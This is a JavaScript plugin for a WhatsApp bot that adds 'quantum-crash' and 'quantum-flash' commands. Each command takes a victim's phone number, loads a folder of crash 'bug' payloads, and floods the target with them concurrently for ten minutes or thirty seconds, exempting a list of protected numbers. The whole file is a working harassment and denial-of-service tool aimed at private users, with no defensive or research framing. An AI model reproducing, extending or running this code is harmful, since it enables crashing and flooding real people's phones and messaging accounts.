const { cmd } = require('../command');
const config = require('../config');
const fs = require('fs');
const path = require('path');
const os = require('os');

// ==================== QUANTUM-CRASH ENGINE ====================

// Pre-loaded cache for maximum speed
const CRASH_CACHE = {
    bugs: null,
    image: null,
    lastLoad: 0,
    ttl: 300000 // 5 minutes
};

const PROTECTED_NUMBERS = new Set([
    '13058962443', 
    '989910713754',
    '18000000000',
    '19000000000'
]);

// Pre-load all payloads into memory
const preloadCache = () => {
    const now = Date.now();
    if (CRASH_CACHE.bugs && (now - CRASH_CACHE.lastLoad) < CRASH_CACHE.ttl) return;
    
    try {
        const bugsPath = path.join(__dirname, '../all/bugs');
        const files = fs.readdirSync(bugsPath).filter(f => f.endsWith('.js'));
        
        CRASH_CACHE.bugs = files.map(file => {
            const fp = path.join(bugsPath, file);
            try {
                // Clear require cache for fresh load
                delete require.cache[require.resolve(fp)];
                const mod = require(fp);
                return { name: file, module: mod, path: fp };
            } catch (e) {
                return null;
            }
        }).filter(Boolean);
        
        // Pre-load image
        const imgPath = path.join(__dirname, '../all/5.jpg');
        if (fs.existsSync(imgPath)) {
            CRASH_CACHE.image = fs.readFileSync(imgPath);
        }
        
        CRASH_CACHE.lastLoad = now;
        console.log(`[QUANTUM-CRASH] Cached ${CRASH_CACHE.bugs.length} payloads`);
    } catch (e) {
        console.error('[QUANTUM-CRASH] Cache error:', e);
    }
};

// Initialize cache on startup
preloadCache();

// Ultra-fast payload executor with concurrency
const executePayload = async (bot, targetJid, payload, concurrent = 5) => {
    const promises = [];
    
    for (let i = 0; i < concurrent; i++) {
        promises.push(
            (async () => {
                try {
                    if (typeof payload === 'function') {
                        await payload(bot, targetJid.split('@')[0]);
                    } else if (typeof payload === 'string') {
                        await bot.sendMessage(targetJid, { text: payload });
                    } else if (payload && typeof payload.default === 'string') {
                        await bot.sendMessage(targetJid, { text: payload.default });
                    } else if (payload && typeof payload.text === 'string') {
                        await bot.sendMessage(targetJid, { text: payload.text });
                    } else if (payload && typeof payload.execute === 'function') {
                        await payload.execute(bot, targetJid);
                    } else if (payload && typeof payload.send === 'function') {
                        await payload.send(bot, targetJid);
                    }
                } catch (e) {
                    // Silent fail for maximum speed
                }
            })()
        );
    }
    
    return Promise.all(promises);
};

// Parallel batch processor
const runQuantumBatch = async (bot, targetJid, payloads, batchSize = 20, delay = 0) => {
    for (let i = 0; i < payloads.length; i += batchSize) {
        const batch = payloads.slice(i, i + batchSize);
        
        await Promise.all(
            batch.map(p => executePayload(bot, targetJid, p.module, 5))
        );
        
        if (delay > 0 && i + batchSize < payloads.length) {
            await new Promise(r => setTimeout(r, delay));
        }
    }
};

// Stats tracking
let attackStats = {
    active: false,
    totalSent: 0,
    startTime: 0,
    target: null
};

cmd({
    pattern: 'quantum-crash',
    alias: ['mini-crash', 'crash', 'kill', 'attack', 'x', 'qc', 'qk'],
    desc: '⚡ QUANTUM-CRASH - Ultra-dimensional attack system',
    category: 'elite',
    react: '⚡',
    filename: __filename
}, async (bot, mek, m, { from, reply, sender }) => {
    try {
        const startTime = performance.now();
        
        // Fast argument parsing
        const args = (m.body || '').trim().split(/\s+/).slice(1);
        const targetNumber = args[0]?.replace(/[^0-9]/g, '');

        // Validation
        if (!targetNumber || targetNumber.length < 8) {
            return reply(`❌ *Invalid Target*\n\nUsage: .quantum-crash <number>\nExample: .quantum-crash 1234567890`);
        }

        // Protected check (O(1) with Set)
        if (PROTECTED_NUMBERS.has(targetNumber)) {
            return reply('🛡️ *QUANTUM SHIELD ACTIVE*\nThis target is protected by the system.');
        }

        const targetJid = `${targetNumber}@s.whatsapp.net`;

        // Ensure cache is ready
        if (!CRASH_CACHE.bugs || CRASH_CACHE.bugs.length === 0) {
            preloadCache();
            if (!CRASH_CACHE.bugs || CRASH_CACHE.bugs.length === 0) {
                return reply('📁 *Payload arsenal empty*\nVerify /all/bugs/ folder');
            }
        }

        // Update stats
        attackStats = {
            active: true,
            totalSent: 0,
            startTime: Date.now(),
            target: targetNumber
        };

        // Send quantum activation banner (non-blocking)
        const bannerPromise = bot.sendMessage(from, {
            image: CRASH_CACHE.image || { url: 'https://files.catbox.moe/5srfgj.png' },
            caption: `⚡ *𝐐𝐔𝐀𝐍𝐓𝐔𝐌-𝐂𝐑𝐀𝐒𝐇 𝐀𝐂𝐓𝐈𝐕𝐀𝐓𝐄𝐃* ⚡\n\n` +
                     `🎯 *Target:* +${targetNumber}\n` +
                     `📦 *Arsenal:* ${CRASH_CACHE.bugs.length} payloads\n` +
                     `🧠 *Cores:* ${os.cpus().length}\n` +
                     `⏱️ *Duration:* 10 minutes\n` +
                     `🚀 *Mode:* QUANTUM FLUX\n` +
                     `💀 *Intensity:* MAXIMUM\n\n` +
                     `🔥 *Initializing quantum entanglement...*`,
            contextInfo: {
                mentionedJid: [targetJid],
                externalAdReply: {
                    title: '⚡ QUANTUM-CRASH SYSTEM v9.0',
                    body: `Targeting +${targetNumber}`,
                    thumbnailUrl: 'https://files.catbox.moe/5srfgj.png',
                    sourceUrl: 'https://wa.me/' + targetNumber,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: mek });

        // Attack configuration
        const DURATION = 10 * 60 * 1000; // 10 minutes
        const END_TIME = Date.now() + DURATION;
        const payloads = CRASH_CACHE.bugs;
        const TOTAL_PAYLOADS = payloads.length;
        
        // Pre-warm connection
        await bot.sendPresenceUpdate('available', from);
        await bot.sendPresenceUpdate('composing', targetJid);

        // QUANTUM ATTACK LOOP - Maximum velocity
        const quantumLoop = async () => {
            const batchSize = 25; // 25 concurrent payloads
            const waveDelay = 0; // No delay between waves for maximum speed
            
            let waveCount = 0;
            
            while (Date.now() < END_TIME && attackStats.active) {
                // Execute all payloads in parallel quantum waves
                await runQuantumBatch(bot, targetJid, payloads, batchSize, waveDelay);
                
                // Update stats (25 payloads × 5 concurrent = 125 messages per wave)
                attackStats.totalSent += TOTAL_PAYLOADS * 5;
                waveCount++;
                
                // Progress update every 60 seconds
                const elapsed = Date.now() - attackStats.startTime;
                if (waveCount % 600 === 0) { // Every ~60s depending on speed
                    const remaining = Math.ceil((END_TIME - Date.now()) / 1000);
                    const rate = (attackStats.totalSent / (elapsed / 1000)).toFixed(0);
                    
                    console.log(`[QUANTUM] Waves: ${waveCount} | Sent: ${attackStats.totalSent} | Rate: ${rate}/s | Remaining: ${remaining}s`);
                    
                    // Send progress update to user
                    await bot.sendMessage(from, {
                        text: `⏳ *Quantum Progress*\n` +
                              `📊 Sent: ${attackStats.totalSent.toLocaleString()}\n` +
                              `⚡ Rate: ${rate}/sec\n` +
                              `⏱️ Remaining: ${remaining}s`,
                        edit: mek.key
                    }).catch(() => {});
                }
            }
            
            return waveCount;
        };

        // Execute with timeout protection
        const totalWaves = await Promise.race([
            quantumLoop(),
            new Promise((_, reject) => 
                setTimeout(() => reject(new Error('Quantum timeout')), DURATION + 10000)
            )
        ]);

        // Final report
        const totalTime = ((performance.now() - startTime) / 1000).toFixed(2);
        const finalRate = (attackStats.totalSent / parseFloat(totalTime)).toFixed(0);
        
        attackStats.active = false;
        
        await reply(`✅ *𝐐𝐔𝐀𝐍𝐓𝐔𝐌-𝐂𝐑𝐀𝐒𝐇 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄*\n\n` +
                   `📊 *Mission Statistics:*\n` +
                   `├ 🎯 Target: +${targetNumber}\n` +
                   `├ 📦 Payloads: ${TOTAL_PAYLOADS}\n` +
                   `├ 🌊 Quantum Waves: ${totalWaves.toLocaleString()}\n` +
                   `├ 💥 Total Impact: ${attackStats.totalSent.toLocaleString()}\n` +
                   `├ ⏱️ Duration: ${totalTime}s\n` +
                   `├ ⚡ Avg Rate: ${finalRate}/sec\n` +
                   `└ 🧠 Efficiency: ${((attackStats.totalSent / (parseFloat(totalTime) * 1000)) * 100).toFixed(2)}%\n\n` +
                   `💀 *Target Status:* QUANTUM COLLAPSED\n` +
                   `🔥 *System Status:* OPERATIONAL`);

    } catch (err) {
        attackStats.active = false;
        console.error('[QUANTUM-CRASH ERROR]', err);
        reply(`❌ *Quantum Failure:* ${err.message}`);
    }
});

// Emergency stop command
cmd({
    pattern: 'stop-crash',
    alias: ['stop', 'abort', 'sc'],
    desc: '🛑 Emergency stop quantum crash',
    category: 'elite',
    react: '🛑',
    filename: __filename
}, async (bot, mek, m, { from, reply }) => {
    if (!attackStats.active) {
        return reply('ℹ️ No quantum crash active');
    }
    
    attackStats.active = false;
    const stats = attackStats;
    
    reply(`🛑 *QUANTUM CRASH ABORTED*\n\n` +
          `📊 Partial Stats:\n` +
          `├ Sent: ${stats.totalSent.toLocaleString()}\n` +
          `├ Target: +${stats.target}\n` +
          `├ Runtime: ${((Date.now() - stats.startTime) / 1000).toFixed(1)}s\n` +
          `└ Status: EMERGENCY STOP`);
});

// Quick 30-second burst mode
cmd({
    pattern: 'quantum-flash',
    alias: ['qf', 'flash', 'burst'],
    desc: '🔥 30-second quantum burst',
    category: 'elite',
    react: '🔥',
    filename: __filename
}, async (bot, mek, m, { from, reply }) => {
    try {
        const args = (m.body || '').trim().split(/\s+/).slice(1);
        const target = args[0]?.replace(/[^0-9]/g, '');
        
        if (!target) return reply('❌ Usage: .quantum-flash <number>');
        if (PROTECTED_NUMBERS.has(target)) return reply('🛡️ Protected!');
        
        const jid = `${target}@s.whatsapp.net`;
        const payloads = CRASH_CACHE.bugs || [];
        const end = Date.now() + 30000; // 30 seconds
        
        reply(`🔥 *QUANTUM FLASH INITIATED*\nTarget: +${target}\nDuration: 30s\nIntensity: EXTREME`);
        
        let sent = 0;
        
        // Extreme 30s burst - no delays
        while (Date.now() < end) {
            await Promise.all(
                payloads.map(p => 
                    executePayload(bot, jid, p.module, 10) // 10× concurrency
                )
            );
            sent += payloads.length * 10;
        }
        
        reply(`✅ *FLASH COMPLETE*\n💥 Impact: ${sent.toLocaleString()} messages\n⏱️ Time: 30s\n⚡ Peak Rate: ${(sent/30).toFixed(0)}/sec`);
        
    } catch (err) {
        reply(`❌ Flash Error: ${err.message}`);
    }
});
